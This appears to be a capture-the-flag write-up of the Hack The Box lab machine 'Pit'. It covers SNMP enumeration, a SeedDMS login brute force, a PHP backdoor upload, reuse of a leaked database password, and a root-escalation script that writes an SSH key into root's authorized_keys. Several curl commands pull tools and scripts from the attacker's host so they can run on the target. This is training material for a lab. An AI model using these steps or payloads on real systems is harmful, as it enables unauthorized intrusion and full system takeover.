## Default Information
IP address : 10.10.10.241\
OS : Linux

## Enumeration
Firstly, let us enumerate all the open ports using ```Nmap```
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```bash
nmap -sC -sV -A -p- -T4 10.10.10.241 -vv
```

From the output of ```NMAP```, we are able to obtain the following information about the open TCP ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.0 (protocol 2.0) | Open |
| 80	| HTTP | nginx 1.14.1 | Open |
| 9090	| zeus-admin | NIL | Open |

From the output, we are also able to observe an SSL certificate with issuer name
```
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US/organizationalUnitName=ca-5763051739999573755
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-16T23:29:12
| Not valid after:  2030-06-04T16:09:12
| MD5:   0146 4fba 4de8 5bef 0331 e57e 41b4 a8ae
| SHA-1: 29f2 edc3 7ae9 0c25 2a9d 3feb 3d90 bde6 dfd3 eee5
```
We shall first add our hostname to the /etc/hosts file
```
10.10.10.241    pit.htb dms-pit.htb
```
Now, we will do a scan on the UDP ports to find any possible open UDP ports
```
sudo nmap -sU -Pn 10.10.10.241 -T4 -vv 
```
From the output of ```NMAP```, we are able to obtain the following information about the open UDP ports
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 161	| snmp | NMPv1 server; net-snmp SNMPv3 server (public) | Open |
| 593	| http-rpc-epmap | admin-prohibited | Open |
| 17455	| unknown | admin-prohibited | Open |
| 34862	| unknown | admin-prohibited | Open |

## Discovery
Lets now visit the web server and observe what happens
* ```http://dms-pit.htb``` returns a status code of 403 which means that the webpage exists but we are not authorized to view it. 
* ```http://pit.htb:80``` returns a test page for Nginx HTTP Server on Red Hat Enterprise Linux 
* ```https://pit.htb:9090``` returns an admin page for CentOS

Next, we will run whatweb on the 3 URLs, and we observed that the whatweb output for ```https://pit.htb:9090``` contains ```cockpit```, which is a GUI made for sysadmins.
```
┌──(kali㉿kali)-[~]
└─$ whatweb https://pit.htb:9090
https://pit.htb:9090 [200 OK] Cookies[cockpit], Country[RESERVED][ZZ], HTML5, HttpOnly[cockpit], IP[10.10.10.241], PasswordField, Script, Title[Loading...], UncommonHeaders[content-security-policy,x-dns-prefetch-control,referrer-policy,x-content-type-options,cross-origin-resource-policy]
                                                                             
┌──(kali㉿kali)-[~]
└─$ whatweb http://pit.htb:80  
http://pit.htb:80 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
                                                                             
┌──(kali㉿kali)-[~]
└─$ whatweb http://dms-pit.htb
http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]   
```
Directory enumeration with ```dirb``` on ```pit.htb:9090``` returns some meaningful output. However, upon furthur investigation they are not exploitable.
```
┌──(kali㉿kali)-[~]
└─$ dirb https://pit.htb:9090

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 15 10:38:54 2021
URL_BASE: https://pit.htb:9090/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------
GENERATED WORDS: 4612

---- Scanning URL: https://pit.htb:9090/ ----
+ https://pit.htb:9090/favicon.ico (CODE:200|SIZE:819)                      
+ https://pit.htb:9090/ping (CODE:200|SIZE:24)                              
                                                                               
-----------------
END_TIME: Sun Aug 15 11:37:22 2021
DOWNLOADED: 4612 - FOUND: 2
```

From the previous ```NMAP``` scan, we know that port 161 is running on SNMP server and it is using a Public community string for authentication. 
Public community string is a default community string and is used as a password to access the SNMP server. However, this public string only allows users to have read access but not write access.
```
NMPv1 server; net-snmp SNMPv3 server (public)
```

Next, we will use ```snmpwalk``` to enumerate all the information on the SNMP server. The information that is outputted is very massive so we will redirect all the input into a file.
```
snmpwalk -v 1 -c public 10.10.10.241 .1 > snmp    
```
Analyzing the file, we are able to discover a few interesting information such as the existence of a directory ```/var/www/html/seeddms51x/seeddms```, which may be accessible from the website as well as, several credentials 
```
## Suspicious directory (might be accessible from the web server)
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
## Credentials on SNMP server
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
```

Let's now try to access ```/seeddms51x/seeddms``` on the web server.
* ```http://pit.htb/seeddms51x/seeddms``` returns a Nginx error on the webpage
* ```https://pit.htb:9090/seeddms51x/seeddms``` just returns a CentOS admin login page
*  ```http://dms-pit.htb/seeddms51x/seeddms/``` redirects us to a login page

However, we do not know the credentials to login to the SeedDMS. First we try to use the default username and password of ```admin``` to login to SeedDMS, but it seems that this username-password combination is invalid. Now, we will try to brute force login into the webpage using ```rockyou.txt``` file as the password file for the 2 users that we have discovered earlier \
Using intruder, we will bruteforce all the username-password combinations using clusterbomb mode. We would then realize that the password is also ```michelle``` as we are redirected to an internal URL in the response
```
HTTP/1.1 302 Found
Server: nginx/1.14.1
Date: Sun, 15 Aug 2021 19:31:18 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.24
Set-Cookie: mydms_session=30bc74de3d5d3f515046b817c127d006; path=/seeddms51x/seeddms/; HttpOnly
Location: /seeddms51x/seeddms/out/out.ViewFolder.php?folderid=1
Content-Length: 0
```
Logging into the site using the discovered credentials, we were able to find a know that the version of SeedDMS used is version ```5.1.15```. We will then look for exploits related to SeedDMS 5.1.15 using exploitDB. We are also able to find a ```CHANGELOG``` file, but the file does not provide any information that points to any possible exploitation.
```
Dear colleagues, Because of security issues in the previously installed version (5.1.10), I upgraded SeedDMS to version 5.1.15. See the attached CHANGELOG file for more information. If you find any issues, please report them immediately to admin@dms-pit.htb
```

Searching for the potential CVEs for SeedDMS, we were able to find an exploit for CVE-2019-12744 on exploitDB. Even though, this is an exploit for SeedDMS < 5.1.11, we decided to give it a try anyways. This exploit provides us with a php file that we could potentially upload and carry out remote code execution attacks. Moving through the pages, we are also able to discover a webpage to upload documents ```http://dms-pit.htb/seeddms51x/seeddms/out/out.AddDocument.php?folderid=8&showtree=1```

![Uploading backdoor to the web server](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pit/uploading_backdoor.PNG)

After uploading the file, we will be able to obtain our ```documentid``` and we will be able to access the uploaded file at ```http://dms-pit.htb/seeddms/data/1048576/<documentid>/1.php```. This is a bit challenging to do as the uploaded file will be deleted within a fixed time interval. Afterwards, we will create a POC to obtain the ```/etc/passwd``` file from the uploaded backdoor.

![Creating the POC](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pit/POC.PNG)

Next,we will try to do a reverse shell back to our attacking machine. However, this time round the exploit seems to have failed (Probably due to some WAF filtering). So, what we do next is to traverse through the directory to find for more information. Thankfully, we were able to find ```/var/www/html/seeddms51x/data/conf/settings.xml```. However, viewing it on the website only provides us with a few text that looks like some Ubuntu command. However, what was weird was that there was the highlighting of the empty spaces on the website when we try to highlight the webpage. This got me thinking that there may be some hidden chracters not shown on the webpage itself.

![Viewing weird encoding on the website](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pit/weird_encoding.PNG)

Next, I try to view the source code of the webpage and was able to find the full ```settings.xml``` file in ```/var/www/html/seeddms51x/conf/``` directory. From the file, I was able to pick up some database credentials that may be useful.
```
    <!--
       - dbDriver: DB-Driver used by adodb (see adodb-readme)
       - dbHostname: DB-Server
       - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)
       - dbUser: username for database-access
       - dbPass: password for database-access
    -->    
    <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
    </database>
    <!-- smtpServer: SMTP Server hostname
       - smtpPort: SMTP Server port
       - smtpSendFrom: Send from
    -->    
    <smtp smtpServer="localhost" smtpPort="25" smtpSendFrom="seeddms@localhost" smtpUser="" smtpPassword=""/> 
```

## Obtaining user flag
Using the database password and the user ```michelle``` as the username, we are able to login to the web admin portal on ```pit.htb:9090```. This portal seems to be a monitoring platform to monitor the services/infrastructure of the web servers. Researching on the CentOS web admin portal, we are able to find a ```/system/terminal``` endpoints that contains a web terminal. \
From the web terminal, we are then able to obtain the user flag.
```
[michelle@pit ~]$ ls
user.txt
[michelle@pit ~]$ cat user.txt
<Redacted user flag>
[michelle@pit ~]$ 
```

## Obtaining system flag
First, let run the ```linpeas``` script to check the permissions on this terminal. However, the script was unable to provide any meaningful output about possible privilege escalations. 
```
[michelle@pit ~]$ curl -o linpeas.sh http://10.10.16.250:8000/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  447k  100  447k    0     0   158k      0  0:00:02  0:00:02 --:--:--  158k
```
Next we double check the output from the ```snmpwalk``` earlier and we discover a suspicious string ```/usr/bin/monitor```
```
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
```

Let's check the contents of ```/usr/bin/monitor```. We can see that ```/usr/bin/monitor``` executes a script in ```/usr/local/monitoring/check*sh```, but we do not have the permissions to view the directory and we are also unable to find the file. 
```
[michelle@pit ~]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
[michelle@pit ~]$ echo $script

[michelle@pit ~]$ ls /usr/local/monitoring
ls: cannot open directory '/usr/local/monitoring': Permission denied
[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
cat: /usr/local/monitoring/check.sh: No such file or directory
[michelle@pit ~]$ 
```

Next, we will have to try to obtain the file access permissions for ```/usr/local/monitoring```. From the output, we can see that the directory is owned by ```root``` and ```michelle``` is able to write and execute files in the directory.

```
[michelle@pit ~]$ getfacl /usr/local/monitoring
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
```

So, let's test out the hypothesis for the file by writing a file to the directory. However, we noticed that after a fixed time period, the file will be deleted.
```
[michelle@pit ~]$ echo "testfile" > /usr/local/monitoring/test.txt
[michelle@pit ~]$ cat /usr/local/monitoring/test.txt
testfile
[michelle@pit ~]$ ls -la /usr/local/monitoring/test.txt
-rw-rw-r--. 1 michelle michelle 9 Aug 19 11:24 /usr/local/monitoring/test.txt
[michelle@pit ~]$ cat /usr/local/monitoring/test.txt
cat: /usr/local/monitoring/test.txt: No such file or directory
[michelle@pit ~]$ 
```

Now, let's first create a POC file, ```check.sh``` with the following contents:
```
#!/bin/bash
ping 10.10.16.250
```

Afterwards we will curl the file and copy the file to the ```/usr/local/monitoring``` directory
```
michelle@pit ~]$ curl -O http://10.10.16.250:8000/check.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    30  100    30    0     0     28      0  0:00:01  0:00:01 --:--:--    28
[michelle@pit ~]$ cp check.sh /usr/local/monitoring
[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
#!/bin/bash

ping 10.10.16.250[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
#!/bin/bash

ping 10.10.16.250[michelle@pit ~]$ 
```

Next we will then execute ```/usr/bin/monitor``` script using ```snmpwalk```
```
┌──(kali㉿kali)-[~]
└─$ snmpwalk -v 1 -c public 10.10.10.241 iso.3.6.1.4.1.8072.1.3.2.2.1                            1 ⚙
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.10.109.111.110.105.116.111.114.105.110.103 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.4.10.109.111.110.105.116.111.114.105.110.103 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.5.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 5
iso.3.6.1.4.1.8072.1.3.2.2.1.6.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.20.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 4
iso.3.6.1.4.1.8072.1.3.2.2.1.21.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
```

Our POC has proven to be worked as seen from the ping command that could be captured from WireShark
![Wireshark traffic](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pit/ping_command.PNG)

Now, we have to first create a key file using ```ssh-keygen```. Then, we will have to create our exploit file, ```check.sh``` with the following contents to add our public key to the ```root``` user's authorized keys so that we can SSH into the root user
```
#!/bin/bash

echo "<SSH public keys>" > /root/.ssh/authorized_keys
```

As usual, we will have to curl the exploit file from our server and then copy it into the ```/usr/local/monitoring/``` directory. Afterwards, we will then execute the command at ```/usr/bin/monitor``` using ```snmpwalk``` and then we will SSH into the root user at 10.10.10.241 to obtain the root flag
```
┌──(kali㉿kali)-[~/Desktop]
└─$ snmpwalk -v 1 -c public 10.10.10.241 iso.3.6.1.4.1.8072.1.3.2.2.1                            1 ⚙
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.10.109.111.110.105.116.111.114.105.110.103 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.4.10.109.111.110.105.116.111.114.105.110.103 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.5.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 5
iso.3.6.1.4.1.8072.1.3.2.2.1.6.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.20.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 4
iso.3.6.1.4.1.8072.1.3.2.2.1.21.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
                                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i key root@10.10.10.241                                                                 1 ⚙
The authenticity of host '10.10.10.241 (10.10.10.241)' can't be established.
ECDSA key fingerprint is SHA256:N07IT3fGYgOB1uKAL/kctwXiIXEDS6kmuNno6+6uQts.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.241' (ECDSA) to the list of known hosts.
Web console: https://pit.htb:9090/

Last login: Mon Jul 26 06:58:15 2021
[root@pit ~]# cat root.txt
<Redacted root flag>
[root@pit ~]# 
```
